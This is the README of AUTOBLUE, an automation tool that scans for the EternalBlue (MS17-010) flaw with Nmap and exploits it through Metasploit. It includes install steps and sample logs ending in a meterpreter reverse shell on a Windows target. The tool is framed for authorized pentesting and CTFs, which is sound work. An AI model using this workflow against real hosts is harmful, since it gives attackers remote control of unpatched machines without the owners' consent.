## AUTOBLUE: Automated EternalBlue Exploit Tool

**AUTOBLUE** is an automation tool designed to exploit the **EternalBlue vulnerability (CVE-2017-0144)** on Windows machines. The tool integrates the power of **Nmap** for vulnerability scanning and **Metasploit's msfconsole** for exploitation, enabling users to automatically identify vulnerable systems and launch the EternalBlue exploit to gain remote access to the target.

This tool is primarily designed for security professionals, penetration testers, and ethical hackers working in controlled, authorized environments such as Capture The Flag (CTF) challenges, penetration testing engagements, or lab setups. **AUTOBLUE** allows users to exploit the EternalBlue vulnerability with minimal manual intervention by simply inputting the target IP address.


**Features**

* **Automated Vulnerability Scanning:** Uses Nmap to scan for the **EternalBlue** vulnerability (CVE-2017-0144) on the target machine.

* **Seamless Exploitation:** Leverages **Metasploit's msfconsole** to launch the **EternalBlue** exploit automatically.

* **Simple Setup:** Only requires a target IP address and a working environment with **Nmap** and **Metasploit** installed.

* **Output Reporting:** Generates output indicating the success or failure of the exploit attempt.



**Table of Contents**

* Prerequisites

* Installation

* Usage

* How It Works

* Security Considerations

* Contributing

* License

* Acknowledgments

* Disclaimer

**Prerequisites:**
  
Before using **AUTOBLUE**, ensure that the following tools are installed on your machine:

**Nmap:** A network scanning tool to detect vulnerable machines.

**Metasploit Framework:** A penetration testing platform that includes exploits for EternalBlue.




**Install Nmap:**

* On Linux (Debian-based):


**Copy code**

          sudo apt update

**and**
     
          sudo apt install nmap
 
On Windows or macOS, download Nmap from the official website.

**Install Metasploit:**

On Linux (Debian-based):

**Copy code**

          sudo apt update

 **and**
 
         sudo apt install metasploit-framework
         
On Windows or macOS, download Metasploit from the official website.

**Installation:**

To install AUTOBLUE, follow these steps:

* **Clone the repository:**

 
        git clone https://github.com/AtithKhawas/autoblue.git

    **and**

           cd autoblue

     
Ensure that Nmap and Metasploit are correctly installed as prerequisites.

* **Make the script executable:**

      chmod +x autoblue.sh



**Usage:**

**AUTOBLUE** is designed to automate the scanning and exploitation of the EternalBlue vulnerability. Here’s how to use it:

*  Run the Tool

To use AUTOBLUE, run the following command in your terminal:


**Copy code**
         
         ./autoblue.sh 

**Output:**

         ┌──(root㉿kali)-[/home/Elliot] 
         └─# ./autoblue.sh 
         ============================================
         ********************************************
         AutoBlue    - EternalBlue Exploit Automation
         ********************************************
         ********************************************
         ------------------------Made by ATITH KHAWAS
         ============================================
         Enter Target IP Address:


It will ask for the Target IP Address and your's. 

 **Sample**
          
          Enter Target IP Address: Target<IP Address>
          Enter Your IP Address: Your <IP Address>


Once you run the tool, It will start scanning with Nmap:

**Output-1**
    
     Target IP Address: ***.***.**.**
     [+] Scanning Target for MS17-010 Vulnerability...
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 12:41 EST
     Nmap scan report for ***.***.**.**
     Host is up (0.19s latency).

     PORT    STATE SERVICE
     445/tcp open  microsoft-ds

     Host script results:
     | smb-vuln-ms17-010: 
     |   VULNERABLE:
     |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
     |     State: VULNERABLE
     |     IDs:  CVE:CVE-2017-0143
     |     Risk factor: HIGH
     |       A critical remote code execution vulnerability exists in Microsoft SMBv1
     |        servers (ms17-010).
     |           
     |     Disclosure date: 2017-03-14
     |     References:
     |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
     |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
     |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

     Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
     [+] Target is VULNERABLE to EternalBlue!

This is where the real work begins, significantly reducing the time-consuming process. If the target is vulnerable, it automatically launches the Msfconsole and sets the RHOSTS, PAYLOAD, LHOST, and LPORT with the default port being 4444.

**Output-2**

          [+] Launching Metasploit...
          [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
          RHOSTS => ***.***.**.**
          PAYLOAD => windows/x64/meterpreter/reverse_tcp
          LHOST => ***.***.**.**
          LPORT => 4444
          [*] Started reverse TCP handler on ***.***.**.**:4444 


And give us the Meterpreter Shell of the target.

**Output-3**

           [+] ***.***.**.**:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
           [+] ***.***.**.**:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
           [+] ***.***.**.**:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

           meterpreter > pwd
           C:\Windows\system32



**How It Works:**

* **Nmap Script Scanning:** The tool first uses **Nmap Script Scan(--script smb-vuln-ms17-010)** to detect whether the target machine is vulnerable to the **EternalBlue** exploit. It checks if port 445 is open and attempts to identify SMB vulnerabilities.

* **Metasploit Exploit:** If the target machine is found vulnerable, **AUTOBLUE** proceeds to launch the **EternalBlue** exploit using **Metasploit's msfconsole**. The script will configure and send the necessary payload to exploit the vulnerability.

* **Reverse Shell:** If the exploit is successful, a reverse shell will be opened to provide a command-line interface on the victim machine.

* **Feedback:** The tool provides feedback throughout the process, including whether the target was successfully exploited, and outputs any relevant information (e.g., IP address of the reverse shell).



**Security Considerations:**

* **Legal Usage:** This tool should only be used in **authorized environments**. Ensure you have explicit permission to test the target machine and that it is not illegal to do so in your jurisdiction.

* **User Input:** Make sure that only trusted IPs are fed into the tool to prevent misuse. Running this tool on untrusted systems could lead to security incidents.

* **Payload Security:** The reverse shell payload used in this tool is inherently risky. Do not expose the attack machine or its listeners to untrusted networks.

* **Keep Dependencies Updated:** Make sure to regularly update **Nmap** and **Metasploit** to mitigate known security vulnerabilities in those tools.



**Contributing:**

Contributions to the AUTOBLUE project are welcome. If you have any suggestions, improvements, or bug fixes, feel free to fork the repository and create a pull request.

**License:**

This tool is open-source and distributed under the MIT License. You are free to use, modify, and distribute the software in your own projects. However, you must include this notice in all copies or substantial portions of the software.



**Acknowledgments:**

* **Nmap:** For providing the essential vulnerability scanning functionality.

* **Metasploit:** For supplying the framework to exploit the EternalBlue vulnerability.

* **Security Researchers:** For discovering and publicly disclosing the EternalBlue vulnerability, which has helped secure systems around the world.

**Disclaimer:**
 
 
 **AUTOBLUE** is a tool intended for educational and ethical use only. The authors are not responsible for any illegal actions taken using this tool. It is your responsibility to ensure you have explicit permission to perform penetration tests on any system.

Use this tool at your own risk. Always conduct penetration testing activities in a safe and legal environment.



